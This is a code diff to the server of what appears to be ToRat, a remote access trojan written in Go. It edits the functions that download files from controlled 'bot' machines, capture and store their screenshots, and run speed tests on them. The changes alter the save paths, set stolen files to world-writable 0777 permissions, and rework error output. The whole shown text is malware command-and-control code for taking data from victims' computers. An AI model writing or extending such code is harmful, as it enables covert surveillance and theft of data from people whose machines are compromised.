@@ -153,7 +153,7 @@ func (client *activeClient) Download(c *ishell.Context) {
 		return
 	}
 
-	dlPath := filepath.Join("/ToRat/cmd/server/bots/", client.Client.Hostname, r.Fpath)
+	dlPath := filepath.Join(client.Client.Path, r.Fpath)
 	dlDir, _ := filepath.Split(dlPath)
 
 	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
@@ -162,7 +162,7 @@ func (client *activeClient) Download(c *ishell.Context) {
 		return
 	}
 
-	if err := ioutil.WriteFile(dlPath, r.Content, 0600); err != nil {
+	if err := ioutil.WriteFile(dlPath, r.Content, 0777); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path:", err))
 		c.ProgressBar().Stop()
 		return
@@ -218,7 +218,17 @@ func (client *activeClient) Screen(c *ishell.Context) {
 		return
 	}
 
-	err := ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
+	dlPath := filepath.Join(client.Client.Path, "/screenshots/", filename)
+	dlDir, _ := filepath.Split(dlPath)
+
+	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create screenshots path!"))
+		c.ProgressBar().Stop()
+		c.Println(green("[Server] ") + red("[!] ", err))
+		return
+	}
+
+	err := ioutil.WriteFile(dlPath, r, 0777)
 	if err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved:", err))
 		c.ProgressBar().Stop()
@@ -260,7 +270,9 @@ func (client *activeClient) Speedtest(c *ishell.Context) {
 
 	r := shared.Speedtest{}
 	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
-		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client:", err))
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client"))
+		c.ProgressBar().Stop()
+		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
 		return
 	}
 
